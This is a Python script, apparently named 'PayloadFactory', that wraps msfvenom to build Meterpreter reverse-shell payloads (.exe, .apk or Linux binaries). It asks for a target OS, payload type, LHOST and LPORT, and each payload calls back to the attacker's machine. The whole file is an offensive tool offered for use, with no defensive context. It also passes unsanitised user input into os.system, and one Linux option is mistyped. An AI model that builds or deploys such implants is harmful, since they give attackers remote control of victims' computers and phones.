import enquiries
import os




def generatePayload(lhost, lport, payload, location):
    payloadTyp = payload.split("/")[0]
    if payloadTyp == "windows":
        payloadTyp = ".exe"
    if payloadTyp == "linux":
        payloadTyp = ""
    if payloadTyp == "android":
        payloadTyp = ".apk"



    os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" +
              lport + " R > " + location + "/payload" + payloadTyp)
    print("Payload generated!")

def chooseOptions(options):
    choice = enquiries.choose("Which payload do you want?", options)
    lhost = enquiries.freetext("LHOST:")
    lport = enquiries.freetext("LPORT:")
    location = enquiries.freetext("Where should it be stored?(Path)")
    generatePayload(lhost, lport, choice, location)


def windows():

    options = ["windows/meterpreter/reverse_tcp", "windows/meterpreter/reverse_tcp_uuid", "windows/meterpreter/reverse_tcp_dns",
               "windows/meterpreter/reverse_http", "windows/meterpreter/reverse_https", "windows/meterpreter/reverse_winhttp", "windows/meterpreter/reverse_winhttps"]
    chooseOptions(options)


def linux():

    options = ["linux/x86/meterpreter/reverse_tcp", "linux/x86/meterpreter/reverse_tcp_uuid", "linux/x86/meterpreter/reverse_http",
               "linux/x86/meterpreter/reverse_https", "linux/x86/meterpreter/reverse_ipv6_tcp", "linx/x86/meterpreter/reverse_nonx_tcp"]
    chooseOptions(options)




def android():

    options = ["android/meterpreter/reverse_tcp",
               "android/meterpreter/reverse_http", "android/meterpreter/reverse_https"]
    chooseOptions(options)


def main():

    print("""


  _____            _                 _ ______         _                   
 |  __ \          | |               | |  ____|       | |                  
 | |__) |_ _ _   _| | ___   __ _  __| | |__ __ _  ___| |_ ___  _ __ _   _ 
 |  ___/ _` | | | | |/ _ \ / _` |/ _` |  __/ _` |/ __| __/ _ \| '__| | | |
 | |  | (_| | |_| | | (_) | (_| | (_| | | | (_| | (__| || (_) | |  | |_| |
 |_|   \__,_|\__, |_|\___/ \__,_|\__,_|_|  \__,_|\___|\__\___/|_|   \__, |
              __/ |                                                  __/ |
             |___/                                                  |___/ 

    """)
    options = ["Windows", "Linux", "Android"]

    choice = enquiries.choose("What is the target OS?", options)
    globals()[choice.lower()]()


if __name__ == "__main__":
    main()
